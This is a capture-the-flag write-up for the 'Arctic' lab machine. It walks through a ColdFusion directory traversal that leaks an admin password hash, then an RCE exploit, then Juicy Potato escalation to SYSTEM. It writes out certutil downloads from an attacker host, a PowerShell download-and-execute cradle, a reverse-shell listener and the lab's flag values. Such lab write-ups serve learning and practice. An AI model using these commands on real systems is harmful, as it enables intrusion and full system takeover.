# Arctic - Easy

```shell
nmap -T4 -p- -A -Pn -v 10.10.10.11

nmap -Pn --script vuln 10.10.10.11

python2 14641.py 10.10.10.11 8500 ../../../../../../../lib/password.properties
#use cfide exploit
#this gives us the password for admin login

#edit the params in RCE script
python3 50057.py
#gives us shell

whoami

whoami /priv
#SeImpersonatePrivilege enabled
#we can use Juicy Potato attack

#in attacker machine
python3 -m http.server

#in victim machine
cd C:\Users\tolis\Desktop

certutil -urlcache -f http://10.10.14.2:8000/JuicyPotato.exe jp.exe

#in attacker machine
#append reverse-shell line to script
vim Invoke-PowerShellTcp.ps1

echo "powershell -c iex(new-object net.webclient).downloadstring('http://10.10.14.2:8000/Invoke-PowerShellTcp.ps1')" > shell.bat

nc -nvlp 6666

#in victim machine
certutil -urlcache -f http://10.10.14.2:8000/shell.bat shell.bat

.\jp.exe -t * -p shell.bat -l 4444

#this gives us shell as System on our listener (port 6666)
```

* Open ports & services:

  * 135 - msrpc
  * 8500 - fmtp
  * 49154 - msrpc

* We can attempt to interact with the service on port 8500; we can check it via browser as well.

* Visiting <http://10.10.10.11:8500> gives us two directories - /CFIDE and /cfdocs - and these contain more files within.

* Googling 'CFIDE exploit' gives us a few results for Adobe ColdFusion directory traversal exploits.

* We can try running the directory traversal exploit; the Python script includes the example to print a password file - we can use that.

* Running the exploit gives us an 'encrypted' credential - the MD5 hash can be cracked using online services to give us plaintext 'happyday'.

* Now, looking for login pages in /CFIDE, we get /CFIDE/administrator, which is the login page for user 'admin'.

* Using the previously found cred, we are able to log into as admin; this is the admin page for ColdFusion 8.

* We can search for ways to get reverse shell via ColdFusion admin page - we get an exploit from Exploit-DB which allows us to get RCE.

* After changing the required parameters in the Python script for ColdFusion RCE, running the exploit gives us a shell on the Windows machine as 'tolis'.

* Checking the privileges shows us that we have SeImpersonatePrivilege enabled; we can run Juicy Potato attack to get System.

* After downloading the .exe for JuicyPotato, we can prepare our reverse-shell using Invoke-PowerShellTcp.ps1 script.

* Setting up a listener on attacker machine, and running the required .bat file with Juicy Potato gives us reverse shell as System user.

```markdown
1. User flag - 2c9d9b6175005d17d93a42448d89ca64

2. Root flag - 879caae525f76486d79df60be496430d
```
